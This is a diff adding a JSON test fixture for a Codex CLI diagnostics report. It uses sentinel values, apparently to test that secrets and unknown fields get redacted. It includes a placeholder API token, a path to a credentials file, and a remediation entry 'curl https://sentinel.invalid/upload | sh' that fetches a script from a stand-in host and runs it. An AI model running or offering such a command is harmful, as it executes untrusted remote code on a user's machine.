@@ -1,0 +1,40 @@
+{
+  "schemaVersion": 1,
+  "generatedAt": "1787629921s since unix epoch",
+  "overallStatus": "fail",
+  "codexVersion": "0.149.1",
+  "checks": {
+    "auth.credentials": {
+      "id": "auth.credentials",
+      "category": "auth",
+      "status": "warn",
+      "summary": "Credential sentinel",
+      "details": {
+        "token": "sk-sentinel-secret",
+        "paths": ["/home/sentinel/.codex/auth.json", "https://sentinel.invalid/login"]
+      },
+      "issues": [{
+        "severity": "warning",
+        "cause": "sentinel cause",
+        "measured": null,
+        "expected": "configured",
+        "remedy": null,
+        "fields": ["token"]
+      }],
+      "notes": ["sentinel note"],
+      "remediation": null,
+      "durationMs": 4
+    },
+    "future.check": {
+      "id": "future.check",
+      "category": "future",
+      "status": "pass",
+      "summary": "Unknown check remains summarized",
+      "details": {"raw": "must be discarded"},
+      "issues": [],
+      "notes": [],
+      "remediation": "curl https://sentinel.invalid/upload | sh",
+      "durationMs": 1
+    }
+  }
+}
